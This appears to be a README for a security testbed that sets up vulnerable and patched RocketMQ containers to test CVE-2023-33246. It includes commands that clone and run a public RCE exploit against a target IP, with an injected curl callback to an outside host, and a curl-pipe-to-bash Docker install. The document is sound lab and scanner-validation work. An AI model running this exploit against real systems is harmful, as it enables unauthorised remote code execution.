# requirements setup
spin up an `Ubuntu 22.04` fresh instance and log in as root.
```bash
apt update
apt install dos2unix
wget -q -O - "https://get.docker.com/" | dos2unix | bash
# clone the repo
# cd security-testbeds/rocketmq/CVE-2023-33246
```
# setup Vulnerable instance
## Start service
```bash
docker compose -f docker-compose-vulnerable.yml up 
```
## test the exploit
### simple test
```bash
git clone https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT/tree/main
cd CVE-2023-33246_RocketMQ_RCE_EXPLOIT
python3 check.py --ip <IP>
```
The python script will output a message with the version and the exploitability
### test with OOB
```bash
 python3 CVE-2023-33246_RocketMQ_RCE_EXPLOIT.py <IP> <PORT> 'curl http://<HOSTNAME>:<PORT>/test'
```
# setup secure instanced
## Start service
```bash
docker compose -f docker-compose-secure.yml up
```

Ref:
https://vulncheck.com/blog/rocketmq-exploit-payloads